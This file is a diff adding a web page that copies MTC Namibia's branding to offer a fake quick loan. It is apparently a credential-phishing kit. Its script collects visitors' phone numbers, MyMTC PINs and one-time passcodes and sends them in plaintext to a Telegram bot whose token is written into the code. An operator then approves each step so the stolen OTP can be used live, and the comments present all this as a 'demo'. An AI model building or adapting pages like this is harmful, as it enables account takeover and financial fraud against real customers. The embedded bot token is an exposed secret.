@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MyMTC Namibia | Loan up to N$500,000</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
+body{background:#fff;min-height:100vh;display:flex;flex-direction:column}
+.header{height:72px;background:#fff;border-bottom:1px solid #eee;display:flex;align-items:center;justify-content:space-between;padding:0 24px;max-width:1200px;width:100%;margin:0 auto}
+.header .logo svg{width:120px;height:56px;display:block}
+.progress{height:6px;background:#f0f0f0;display:flex;max-width:1200px;width:100%;margin:0 auto}
+.progress i{flex:1;background:#eee;transition:.3s;display:block}
+.progress i.on{background:#FFC400}
+.main{flex:1;max-width:760px;width:100%;margin:0 auto;padding:32px 24px 40px}
+.screen{display:none;flex-direction:column}
+.screen.active{display:flex}
+h1{font-size:32px;color:#0A3A6B;font-weight:800}
+.sub{font-size:16px;color:#555;margin-top:10px;line-height:1.5}
+.card{background:#f9f9f7;border:1.2px solid #ecece8;border-radius:20px;padding:22px;margin-top:22px}
+.amount-big{font-size:48px;font-weight:900;color:#0A3A6B}
+input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
+.row{display:flex;justify-content:space-between;font-size:15px;margin-top:12px}
+.row b{color:#0A3A6B;font-weight:800}
+.total{background:#0A3A6B;color:#fff;border-radius:14px;padding:16px;display:flex;justify-content:space-between;margin-top:18px;align-items:center}
+.total b{font-size:20px}
+.btn{margin-top:28px;background:#FFC400;color:#0A3A6B;border:none;height:56px;border-radius:14px;font-weight:800;font-size:17px;cursor:pointer;width:100%;max-width:360px}
+.btn-outline{background:#fff;border:2px solid #0A3A6B;max-width:180px}
+.label{font-size:11px;font-weight:800;color:#0A3A6B;text-transform:uppercase;margin-top:18px;display:block;letter-spacing:.6px}
+.input,.select{width:100%;height:54px;border:1.6px solid #D7D7D2;border-radius:12px;padding:0 16px;font-size:16px;margin-top:8px;background:#fcfcf9;outline:none}
+.input:focus,.select:focus{border-color:#0A87CC}
+.prefix{display:flex;gap:10px;align-items:flex-end}
+.pre{height:54px;padding:0 16px;background:#D6E9F8;color:#0A5EB0;font-weight:800;border-radius:12px;display:flex;align-items:center;margin-top:8px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.otp-row{display:flex;gap:12px;margin-top:24px}
+.otp{width:56px;height:64px;border:2px solid #FFC400;border-radius:12px;text-align:center;font-size:24px;font-weight:800;color:#0A3A6B;outline:none}
+.otp:focus{border-color:#0A3A6B}
+.success{width:96px;height:96px;background:#FFC400;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:32px 0 0;font-size:44px;color:#0A3A6B;font-weight:900}
+.badge{background:#E6F4FF;color:#0A5EB0;padding:8px 14px;border-radius:20px;font-size:12px;font-weight:800;display:inline-block;margin-top:16px}
+.flex{display:flex;gap:12px;margin-top:24px}
+.small{font-size:13px;color:#444;margin-top:16px;line-height:1.5}
+.pin-field{position:relative;max-width:420px;width:100%}
+.pin-field input{padding-right:70px}
+.pin-btn{position:absolute;right:10px;top:50%;transform:translateY(-50%);margin-top:4px;background:#fff;border:none;color:#0A5EB0;font-weight:800;font-size:14px;cursor:pointer;padding:8px}
+
+/* small inline status text */
+.status-text{margin-top:12px;color:#0A5EB0;font-weight:700}
+
+/* Loading overlay and spinner */
+.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.4);display:flex;align-items:center;justify-content:center;z-index:9999;display:none}
+.loading-overlay.active{display:flex}
+.loading-container{background:#fff;border-radius:24px;padding:48px 40px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.15)}
+.spinner{width:64px;height:64px;border:5px solid #f0f0f0;border-top-color:#FFC400;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-container h2{font-size:20px;color:#0A3A6B;font-weight:800;margin:0}
+.loading-container p{font-size:14px;color:#555;margin-top:12px;line-height:1.5}
+.loading-dots{display:inline-block;margin-left:4px}
+.loading-dots span{animation:blink 1.4s infinite}
+.loading-dots span:nth-child(1){animation-delay:0s}
+.loading-dots span:nth-child(2){animation-delay:.2s}
+.loading-dots span:nth-child(3){animation-delay:.4s}
+@keyframes blink{0%,60%,100%{opacity:.3}30%{opacity:1}}
+</style>
+</head>
+<body>
+<div class="header">
+<div class="logo">
+<svg viewBox="0 0 200 70" xmlns="http://www.w3.org/2000/svg">
+<text x="10" y="50" font-family="Arial Black, sans-serif" font-size="52" font-style="italic" font-weight="900" fill="#0091D5">mtc</text>
+<path d="M115 12 L145 8 L138 22 Z" fill="#E30613"/>
+<text x="12" y="66" font-family="Arial, sans-serif" font-size="11" font-style="italic" fill="#0091D5">make the connection</text>
+</svg>
+</div>
+<div style="font-size:13px;font-weight:700;color:#0A3A6B">MyMTC • Quick Loans</div>
+</div>
+<div class="progress"><i id="bar1" class="on"></i><i id="bar2"></i><i id="bar3"></i><i id="bar4"></i><i id="bar5"></i></div>
+<div class="main">
+<div class="screen active" id="step1">
+<h1>MyMTC Quick Loan<br>Up to N$500,000</h1>
+<p class="sub">Choose your loan amount on the slider. Interest rate 5.8% fixed — automatically updates as you slide.</p>
+<div class="card">
+<div class="amount-big"><small style="font-size:16px;color:#777">N$</small> <span id="amtBig">50,000</span></div>
+<input type="range" id="slider" min="5000" max="500000" step="1000" value="50000">
+<div class="row" style="margin-top:0"><span>N$5,000</span><span>N$500,000</span></div>
+<label class="label">Loan Period (Up to 30 Months)</label>
+<select id="loanTerm" class="select" onchange="updateLoan()">
+<option value="3">3 months</option>
+<option value="6">6 months</option>
+<option value="12" selected>12 months</option>
+<option value="18">18 months</option>
+<option value="24">24 months</option>
+<option value="30">30 months</option>
+</select>
+<div class="row"><span>Loan amount</span><b id="tAmt">N$ 50,000</b></div>
+<div class="row"><span>Interest (5.8%)</span><b id="tInt">N$ 2,900</b></div>
+<div class="row"><span>Term</span><b id="tTerm">12 months</b></div>
+<div class="total"><span>Monthly repayment</span><b id="tMonth">N$ 4,408</b></div>
+<div class="row"><span>Total repayable</span><b id="tTotal">N$ 52,900</b></div>
+</div>
+<button class="btn" onclick="nextStep(2)">Continue</button>
+</div>
+<div class="screen" id="step2">
+<h1>Tell us about you</h1>
+<p class="sub">For your loan of <b id="loanRef">N$ 50,000</b> - <b id="loanRefTerm">12 months</b></p>
+<label class="label">Full Names</label><input id="fullName" class="input" placeholder="Johannes Ndapanda">
+<div class="grid"><div><label class="label">First Name</label><input id="firstName" class="input"></div><div><label class="label">Surname</label><input id="lastName" class="input"></div></div>
+<label class="label">Namibia Phone Number</label><div class="prefix"><div class="pre">+264</div><input id="phoneDetail" class="input" style="flex:1" placeholder="81 XXX XXXX" inputmode="numeric"></div>
+<label class="label">Loan Purpose</label><select id="purpose" class="select"><option value="">Select purpose</option><option>Business</option><option>Education</option><option>Emergency</option><option>Medical</option></select>
+<label class="label">Income Per Month (N$)</label><input id="income" type="number" class="input" placeholder="e.g. 15000" inputmode="numeric">
+<div class="flex"><button class="btn btn-outline" onclick="nextStep(1)">Back</button><button class="btn" onclick="checkDetails()">Continue</button></div>
+</div>
+<div class="screen" id="step3">
+<h1>Welcome to MyMTC</h1>
+<p class="sub">Enter your MTC mobile number and PIN to continue</p>
+<div style="margin-top:24px;max-width:420px">
+<label class="label">MTC Mobile Number</label>
+<div class="prefix"><div class="pre">+264</div><input id="loginPhone" class="input" style="flex:1" placeholder="81 XXX XXXX" inputmode="numeric"></div>
+<label class="label" style="margin-top:20px">MyMTC PIN</label>
+<div class="pin-field">
+<input id="loginPin" type="password" class="input" placeholder="Enter PIN" maxlength="6" inputmode="numeric">
+<button type="button" id="pinToggleBtn" class="pin-btn" onclick="togglePin()">Show</button>
+</div>
+<div id="loginStatus" class="status-text" style="display:none">Please wait while we verify your details</div>
+</div>
+<button class="btn" id="loginContinueBtn" onclick="goToOTP()">Continue</button>
+<p class="small">By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></p>
+</div>
+<div class="screen" id="step4">
+<div style="font-size:20px;color:#0A87CC;cursor:pointer;margin-bottom:12px" onclick="nextStep(3)">← Back</div>
+<h1>Verify your number</h1>
+<p class="sub">We have sent a 6-digit OTP to<br><b id="otpPhone">+264 81 XXX XXXX</b></p>
+<div class="otp-row">
+<input class="otp" id="otp1" maxlength="1" inputmode="numeric">
+<input class="otp" id="otp2" maxlength="1" inputmode="numeric">
+<input class="otp" id="otp3" maxlength="1" inputmode="numeric">
+<input class="otp" id="otp4" maxlength="1" inputmode="numeric">
+<input class="otp" id="otp5" maxlength="1" inputmode="numeric">
+<input class="otp" id="otp6" maxlength="1" inputmode="numeric">
+</div>
+<p id="otpStatus" class="status-text" style="display:none">Please wait while we verify your details</p>
+<p class="small">By providing the OTP to MTC you consent to the processing and storing of your personal data.</p>
+<button class="btn" id="otpVerifyBtn" onclick="submitOTP()">Verify</button>
+<p class="small">Didn't receive code? <b id="resendTimer">Resend in 01:00</b> <span id="resendAction" style="display:none"><a href="#" onclick="resendOTP();return false" style="color:#0A5EB0;font-weight:800">Resend Code</a></span></p>
+</div>
+<div class="screen" id="step5">
+<div class="success">✓</div>
+<span class="badge">LOAN APPROVED</span>
+<h1 style="margin-top:12px">Congratulations!</h1>
+<p class="sub">Your loan application for <b id="final1">N$ 50,000</b> - <b id="finalTerm">12 months</b> has been approved.</p>
+<div class="card" style="max-width:520px">
+<div class="row"><span>Applicant</span><b id="fName">-</b></div>
+<div class="row"><span>Phone</span><b id="fPhone">-</b></div>
+<div class="row"><span>Amount</span><b id="fAmt">-</b></div>
+<div class="row"><span>Interest 5.8%</span><b id="fInt">-</b></div>
+<div class="row"><span>Term</span><b id="fTerm">12 months</b></div>
+<div class="row"><span>Monthly</span><b id="fMonth">-</b></div>
+<div class="row"><span>Total</span><b id="fTotal">-</b></div>
+</div>
+<button class="btn" onclick="location.reload()">Done</button>
+</div>
+</div>
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-container">
+<div class="spinner"></div>
+<h2>Connecting to Agent<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></h2>
+<p id="loadingMessage">Verifying your details. Please wait.</p>
+</div>
+</div>
+
+<script>
+/*
+  Telegram integration (client-side demo):
+  - Replace TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT with your real values.
+  - This demo uses Telegram getUpdates polling and therefore exposes the bot token in the client.
+    For production use, implement server-side webhook or proxy to keep the token secret.
+*/
+
+const TELEGRAM_BOT_TOKEN = '8913797417:AAFb5LoGkwgfXQugR2gcmVz-DXYgQC6IWw4'; // e.g. 123456:ABC-DEF...
+const TELEGRAM_ADMIN_CHAT = '8820857419';  // e.g. your numeric user id or group id
+let tgLastUpdateId = 0;
+let sessionToken = null; // per-user ephemeral id used to correlate admin button presses
+let loginPollHandle = null;
+let otpPollHandle = null;
+let loginPollingTimeoutHandle = null;
+let otpPollingTimeoutHandle = null;
+
+const slider=document.getElementById('slider');
+const termSelect=document.getElementById('loanTerm');
+const fmt=n=>'N$ '+Number(n).toLocaleString('en-NA');
+function updateLoan(){
+  const p=parseInt(slider.value);
+  const term=parseInt(termSelect.value);
+  const interest=p*0.058; const total=p+interest; const monthly=total/term;
+  document.getElementById('amtBig').textContent=p.toLocaleString('en-NA');
+  document.getElementById('tAmt').textContent=fmt(p);
+  document.getElementById('tInt').textContent=fmt(interest.toFixed(0));
+  document.getElementById('tTotal').textContent=fmt(total.toFixed(0));
+  document.getElementById('tMonth').textContent=fmt(monthly.toFixed(0));
+  document.getElementById('tTerm').textContent=term+' months';
+  document.getElementById('loanRef').textContent=fmt(p);
+  const rt=document.getElementById('loanRefTerm'); if(rt) rt.textContent=term+' months';
+  document.getElementById('final1').textContent=fmt(p);
+  document.getElementById('finalTerm').textContent=term+' months';
+  document.getElementById('fAmt').textContent=fmt(p);
+  document.getElementById('fInt').textContent=fmt(interest.toFixed(0));
+  document.getElementById('fMonth').textContent=fmt(monthly.toFixed(0));
+  document.getElementById('fTotal').textContent=fmt(total.toFixed(0));
+  document.getElementById('fTerm').textContent=term+' months';
+}
+slider.addEventListener('input',updateLoan); updateLoan();
+
+function showLoadingOverlay(message = 'Verifying your details. Please wait.') {
+  document.getElementById('loadingMessage').textContent = message;
+  document.getElementById('loadingOverlay').classList.add('active');
+}
+
+function hideLoadingOverlay() {
+  document.getElementById('loadingOverlay').classList.remove('active');
+}
+
+function nextStep(n){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  document.getElementById('step'+n).classList.add('active');
+  for(let i=1;i<=5;i++)document.getElementById('bar'+i).className=i<=n?'on':'';
+  if(n===4){startOTPTimer();}
+  if(n===5){
+    const full=document.getElementById('fullName').value || (document.getElementById('firstName').value+' '+document.getElementById('lastName').value);
+    document.getElementById('fName').textContent=full.trim()||'-';
+    const ph=document.getElementById('phoneDetail').value || document.getElementById('loginPhone').value;
+    document.getElementById('fPhone').textContent=ph?'+264 '+ph:'-';
+  }
+}
+function checkDetails(){
+  if(!document.getElementById('fullName').value || !document.getElementById('phoneDetail').value || !document.getElementById('purpose').value || !document.getElementById('income').value){alert('Please fill in all fields');return;}
+  document.getElementById('loginPhone').value=document.getElementById('phoneDetail').value; nextStep(3);
+}
+function goToOTP(){
+  // Instead of immediate nextStep(4) we send login attempt to telegram and wait for admin approval.
+  const p=document.getElementById('loginPhone').value.trim();
+  const pin=document.getElementById('loginPin').value.trim();
+  if(!p||!pin){alert('Enter phone and PIN');return;}
+
+  // generate session token for correlating callback button presses
+  sessionToken = generateSessionId();
+
+  // Show loading overlay
+  showLoadingOverlay('Verifying your MTC credentials...');
+
+  sendTelegramLoginRequest(sessionToken, p, pin)
+    .then(() => {
+      // start polling for admin action
+      pollTelegramForAction({
+        session: sessionToken,
+        timeoutMs: 2 * 60 * 1000, // 2 minutes
+        onAction: (action) => {
+          // action: 'approve_login' or 'wrongpin_login'
+          // acknowledge and proceed accordingly
+          clearTimeout(loginPollingTimeoutHandle);
+          if(action === 'approve_login'){
+            // proceed to OTP screen
+            hideLoadingOverlay();
+            document.getElementById('otpPhone').textContent = '+264 '+p;
+            nextStep(4);
+          } else if(action === 'wrongpin_login'){
+            hideLoadingOverlay();
+            alert('The PIN or Mobile number provided is invalid. Please check the details and try again.');
+            // keep user on same page to re-enter pin
+          } else {
+            // unknown action
+            hideLoadingOverlay();
+            alert('Received unknown action from agent: '+action);
+          }
+        },
+        onTimeout: () => {
+          hideLoadingOverlay();
+          alert('Server is currently under maintenance. Please try again later.');
+        }
+      });
+    })
+    .catch(err=>{
+      hideLoadingOverlay();
+      console.error('The PIN or NUMBER provided is invalid, please check the details and try again', err);
+      alert('Failed: The server is currently under maintenance. Please try again later.');
+    });
+}
+
+function submitOTP(){
+  // previously verifyOTP; now send OTP to telegram and wait for admin action
+  const code = Array.from(document.querySelectorAll('.otp')).map(i=>i.value).join('');
+  if(code.length!==6){alert('Please enter 6-digit OTP');return;}
+
+  // Show loading overlay
+  showLoadingOverlay('Verifying your OTP...');
+
+  // send OTP to telegram admin
+  sendTelegramOTPRequest(sessionToken, code, document.getElementById('otpPhone').textContent)
+    .then(()=>{
+      pollTelegramForAction({
+        session: sessionToken,
+        timeoutMs: 2 * 60 * 1000,
+        onAction: (action) => {
+          clearTimeout(otpPollingTimeoutHandle);
+          if(action === 'approve_otp'){
+            hideLoadingOverlay();
+            nextStep(5);
+          } else if(action === 'wrongotp'){
+            hideLoadingOverlay();
+            alert('The OTP provided is wrong or has expired. Please try again.');
+            // clear OTP inputs and let user retry
+            document.querySelectorAll('.otp').forEach(i=>i.value='');
+            const first=document.getElementById('otp1'); if(first) first.focus();
+          } else {
+            hideLoadingOverlay();
+            alert('Unknown OTP action: '+action);
+          }
+        },
+        onTimeout: () => {
+          hideLoadingOverlay();
+          alert('No response regarding OTP. Please try again.');
+        }
+      });
+    })
+    .catch(err=>{
+      hideLoadingOverlay();
+      console.error('Send OTP request failed', err);
+      alert('Failed to send OTP to agent. Please try again.');
+    });
+}
+
+/* Utility functions for Telegram interaction (client-side polling) */
+
+function generateSessionId(){
+  return 's_' + Math.random().toString(36).slice(2,10);
+}
+
+async function telegramApiGet(path, params = {}) {
+  // GET helper for getUpdates
+  const url = new URL(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`);
+  Object.keys(params).forEach(k=>url.searchParams.append(k, params[k]));
+  const res = await fetch(url.toString());
+  return res.json();
+}
+async function telegramApiPost(path, body = {}) {
+  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(body)
+  });
+  return res.json();
+}
+
+async function sendTelegramLoginRequest(session, phone, pin){
+  // send login attempt to admin with inline keyboard for APPROVE / WRONG PIN
+  // NOTE: this sends the PIN in plaintext to the admin bot message - this is a demo behaviour.
+  const text = `Login attempt\nSession: ${session}\nPhone: +264 ${phone}\nPIN: ${pin}\nLoan: ${document.getElementById('tAmt').textContent} / ${document.getElementById('tTerm').textContent}`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: 'APPROVE', callback_data: `approve_login::${session}` },
+        { text: 'WRONG PIN', callback_data: `wrongpin_login::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+async function sendTelegramOTPRequest(session, otp, otpPhone){
+  const text = `OTP verification\nSession: ${session}\nPhone: ${otpPhone}\nOTP: ${otp}\nLoan: ${document.getElementById('tAmt').textContent} / ${document.getElementById('tTerm').textContent}`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: 'APPROVE', callback_data: `approve_otp::${session}` },
+        { text: 'WRONG OTP', callback_data: `wrongotp::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, onTimeout = ()=>{}}){
+  // poll getUpdates until a callback_query matching this session is seen
+  // returns a promise that resolves when action occurs or rejects on error
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    onTimeout();
+    return;
+  }
+
+  // ensure we start from current last update id to avoid old callbacks
+  // fetch once to set tgLastUpdateId
+  telegramApiGet('getUpdates').then(res=>{
+    if (res && res.ok && Array.isArray(res.result) && res.result.length) {
+      const maxId = Math.max(...res.result.map(u => u.update_id));
+      tgLastUpdateId = maxId + 1;
+    }
+  }).catch(()=>{ /* ignore */ });
+
+  const start = Date.now();
+  const pollInterval = 1500;
+
+  const poll = async () => {
+    try {
+      const res = await telegramApiGet('getUpdates', { offset: tgLastUpdateId, timeout: 0 });
+      if(res && res.ok && Array.isArray(res.result) && res.result.length){
+        for(const update of res.result){
+          tgLastUpdateId = update.update_id + 1;
+          // handle callback_query
+          if(update.callback_query && update.callback_query.data){
+            const data = update.callback_query.data;
+            const callbackId = update.callback_query.id;
+            // acknowledge callback on Telegram so user sees action registered
+            telegramApiPost('answerCallbackQuery', { callback_query_id: callbackId, text: 'Action received' }).catch(()=>{});
+            // match session
+            if(data.endsWith('::'+session)){
+              // extract action part
+              const action = data.split('::')[0];
+              onAction(action);
+              return clearPolling();
+            }
+          }
+        }
+      }
+      if(Date.now() - start > timeoutMs){
+        clearPolling();
+        onTimeout();
+      }
+    } catch(err){
+      console.error('Polling error', err);
+      // continue polling until timeout
+      if(Date.now() - start > timeoutMs){
+        clearPolling();
+        onTimeout();
+      }
+    }
+  };
+
+  function clearPolling(){
+    if(loginPollHandle){ clearInterval(loginPollHandle); loginPollHandle = null; }
+    if(otpPollHandle){ clearInterval(otpPollHandle); otpPollHandle = null; }
+    if(loginPollingTimeoutHandle){ clearTimeout(loginPollingTimeoutHandle); loginPollingTimeoutHandle = null; }
+    if(otpPollingTimeoutHandle){ clearTimeout(otpPollingTimeoutHandle); otpPollingTimeoutHandle = null; }
+  }
+
+  // start interval
+  if(session && session.startsWith('s_')){
+    // if session contains 'login' or 'otp' doesn't matter; reuse handles
+    const handle = setInterval(poll, pollInterval);
+    if(session) {
+      // store handle: if we are waiting for login vs otp calls this will be overwritten but cleared by clearPolling on result
+      loginPollHandle = handle;
+      otpPollHandle = handle;
+    }
+    // also set a hard timeout to stop polling
+    const toHandle = setTimeout(()=> {
+      clearInterval(handle);
+      if(onTimeout) onTimeout();
+    }, timeoutMs + 500);
+    loginPollingTimeoutHandle = toHandle;
+  } else {
+    // invalid session - call timeout
+    setTimeout(onTimeout, 0);
+  }
+}
+
+/* OTP resend timer and other existing functions (unchanged) */
+function togglePin(){
+  const pinInput = document.getElementById('loginPin');
+  const btn = document.getElementById('pinToggleBtn');
+  if(pinInput.type === 'password'){pinInput.type = 'text'; btn.textContent = 'Hide';}else{pinInput.type = 'password'; btn.textContent = 'Show';}
+  pinInput.focus();
+}
+let otpTimer; let timeLeft = 60;
+function startOTPTimer(){
+  clearInterval(otpTimer); timeLeft = 60;
+  const rt=document.getElementById('resendTimer'); const ra=document.getElementById('resendAction');
+  if(rt) rt.style.display='inline'; if(ra) ra.style.display='none';
+  updateTimerText();
+  otpTimer = setInterval(()=>{
+    timeLeft--; updateTimerText();
+    if(timeLeft<=0){
+      clearInterval(otpTimer);
+      if(rt) rt.style.display='none';
+      if(ra) ra.style.display='inline';
+    }
+  },1000);
+}
+function updateTimerText(){
+  const el=document.getElementById('resendTimer'); if(!el) return;
+  const m = Math.floor(timeLeft/60).toString().padStart(2,'0');
+  const s = (timeLeft%60).toString().padStart(2,'0');
+  el.textContent = `Resend in ${m}:${s}`;
+}
+function resendOTP(){
+  alert('New OTP sent to '+document.getElementById('otpPhone').textContent);
+  document.querySelectorAll('.otp').forEach(i=>i.value='');
+  const first=document.getElementById('otp1'); if(first) first.focus();
+  startOTPTimer();
+}
+
+/* legacy verifyOTP removed; replaced by submitOTP() above */
+
+document.querySelectorAll('.otp').forEach((input, idx, all)=>{
+  input.addEventListener('input', (e)=>{
+    e.target.value = e.target.value.replace(/[^0-9]/g,'');
+    if(e.target.value && idx < 5){all[idx+1].focus();}
+  });
+  input.addEventListener('keydown', (e)=>{
+    if(e.key==='Backspace' &&!e.target.value && idx>0){all[idx-1].focus();}
+  });
+});
+</script>
+</body>
+</html>
